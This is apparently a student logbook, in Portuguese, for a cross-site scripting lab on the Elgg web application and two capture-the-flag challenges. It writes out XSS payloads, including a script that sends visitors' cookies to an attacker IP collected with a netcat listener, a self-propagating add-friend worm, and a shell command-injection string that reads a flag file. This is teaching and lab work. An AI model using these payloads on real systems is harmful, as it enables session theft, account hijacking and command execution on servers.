# LOGBOOK 10

### Lab Environment Setup

Completamos todos os pontos presentes no guião deste lab, isto é, DNS Setup, Container Setup and Commands, Elgg Web Application.

### Preparation

Neste lab vamos precisar de contruir HTTP requests. Para conseguirmos perceber como é um HTTP request em Elgg aceitável, vamos necessitar de poder capturar e analizar HTTP requests. Podemos utilizar uma extensão do Firefox chamada "HTTP Header Live". 
Tivemos que nos ambientar a esta ferramenta, para posteriomente avançar no guião.

## Task 1

O objetivo desta tarefa é incorporar um programa JavaScript no perfil Elgg, de forma que quando outro utilizador visualizar o perfil, o programa JavaScript seja executado e uma janela de alerta seja exibida.

O código JavaScript `<script>alert("XSS");</script>` exibe a janela de alerta. Os resultados estão no finala desta secção.

Com o seguinte código exemplo conseguimos referir um ficheiro .js para executar o código nele contido. Isto é útil para quando temos um programa Javascript de maior dimensão, ao contrário do exemplo anterior.
```
<script type="text/javascript"
        src="http://www.example.com/myscripts.js">
</script>
```

![](https://i.imgur.com/obINJpV.png)

![](https://i.imgur.com/LQACwXx.png)



## Task 2

O objetivo desta tarefa é incorporar um programa JavaScript no perfil Elgg, de modo que, quando outro utilizador visualizar o perfil, os cookies do utilizador sejam exibidos na janela de alerta.

Podemos atingir este objetivo introduzindo no campo "description" o seguinte código Javascript:
```
<script>alert(document.cookie);</script>
```

![](https://i.imgur.com/NDacdlJ.png)

![](https://i.imgur.com/5WBiQOO.png)

## Task 3

Na tarefa anterior, o código JavaScript malicioso escrito pelo invasor pode imprimir os cookies do utilizador, mas apenas o utilizador pode ver os cookies, não o invasor. Nesta tarefa, pretendemos que o código JavaScript envie os cookies para o invasor.

Para conseguirmos fazer isto precisamos que o programa Javascript envie um HTTP request para o atacante, com as cookies anexados.
Podemos usar uma tag img com o atributo src a apontar para a máquina do atacante. O browser vai tentar carregar a imagem, mas em vez disso vai fazer um pedido GET à máquna do invasor.

O seguinte código JavaScript envia os cookies para a porta 5555 da máquina do invasor (com endereço IP 10.9.0.1), onde o invasor possui um servidor TCP pronto a ouvir na mesma porta.
```
<script>
document.write("<img src=http://10.9.0.1:5555?c=" + escape(document.cookie) + " >");
</script>
```

![](https://i.imgur.com/w87IOAZ.png)

Um programa bastante utilizado por invasores é o netcat (ou nc) , que, se executado com a opção "-l", torna-se um servidor TCP que escuta uma conexão na porta especificada. Este programa de servidor basicamente imprime tudo o que é enviado pelo cliente e envia para o cliente tudo o que é digitado pelo utilizador executando o servidor. Com o comando `$ nc -lknv 5555` conseguimos escutar na porta 5555.

A opção -l é usada para especificar que o nc deve escutar uma conexão de entrada em vez de iniciar uma conexão com um host remoto. A opção -nv é usada para que o nc forneça uma saída mais detalhada. A opção -k significa que quando uma conexão for concluída, deve ouvir outra.

Utilizamos o comando netcat que referimos em cima para ouvir todos os request feitos por utilizadores que visitaram o nosso perfil. Esses requests contêm os cookies do utilizador, como pode ser visto em baixo:

![](https://i.imgur.com/qWdb0cf.png)


## Task 4

Nesta e na próxima tarefa, pretendemos realizar um ataque semelhante ao que Samy Worm fez ao MySpace em 2005. O objetivo é escrever um worm XSS que adiciona Samy como amigo a qualquer outro utilizador que visite a página de Samy.

Podemos adicionar Samy como amigo normalmente e, com a extensão HTTP Header Live, podemos descobrir como um HTTP request de amigo é codificado.

![](https://i.imgur.com/Mu1WEtN.png)

Utilizando esta informação, podemos criar um script que, ao ser executado, forja uma solicitação que adiciona Samy como amigo ao utilizador autenticado.

```
<script type="text/javascript">
  window.onload = function () {
    var Ajax=null;
    
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;          ➀
    var token="&__elgg_token="+elgg.security.token.__elgg_token; ➁
    
    //Construct the HTTP request to add Samy as a friend.
    var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
    
    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
  }
</script>
```

Colocamos este script no campo "About me" para ser executado por um utilizador quando este entrar no nosso perfil.

![](https://i.imgur.com/G0dju90.png)

![](https://i.imgur.com/28hoQiI.png)

Antes de visitar o perfil do Samy:

![](https://i.imgur.com/qoYQlQW.png)

Depois de visitar o perfil do Samy:

![](https://i.imgur.com/4VcqtK0.png)


#### Question 1 - Explain the purpose of Lines ➀ and ➁, why are they needed?

As linhas ➀ e ➁, marcadas no script da secção 4, servem para enviar o token elgg no request forjado para que o servidor avalie o request como um request válido do utilizador. Estes tokens servem para prevenir Cross Site Request Forgery.

#### Question 2 - If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?

Um ataque bem-sucedido não pode ser iniciado, pois o modo Editor filtra os caracteres especiais HTML e não podemos editar o conteúdo HTML interno do campo. Portanto, injetar qualquer script no campo "About me" não é possível, pois não podemos enviar a tag < script > no perfil.

# CTFs

## Desafio 1

Depois de analisar o formulário, apercebemo-nos que este é vulnerável a XSS. Portanto, para obter a flag, inserimos no formulário um script que faz com que o botão "Give the flag" que estava desativado seja acionado e, assim, o administrador responde ao pedido e a flag aparece.

![](https://i.imgur.com/D3z5syb.png)

![](https://i.imgur.com/woPZvSW.png)

![](https://i.imgur.com/iOP5gSy.png)

## Desafio 2

Ao analisar o servidor web, conseguimos identificar que o comando ping está a ser implementado pelo servidor.

``` ping [options] hostname or IP address ```

O ping é um utilitário linux que pode ser usado para verificar se uma rede está presente e se um host pode ser acessado.

Como podemos ver na imagem seguinte, o comando ping é executado no endereço IP inserido (127.0.0.1).

![](https://i.imgur.com/R3XKlos.png)

 Caso se insiram argumentos inválidos, o ping não é executado e o site não produz resposta.

![](https://i.imgur.com/btiUYtY.png)

Quando injetamos o código, este é o código que na realidade é executado:

``` ping 127.0.0.1; cat /flags/flag.txt ```

Ou seja, estão a ser executados dois comandos diferentes da shell. O segundo comando imprime a flag.

![](https://i.imgur.com/QZANr3J.png)

![](https://i.imgur.com/Ygwjiz0.png)

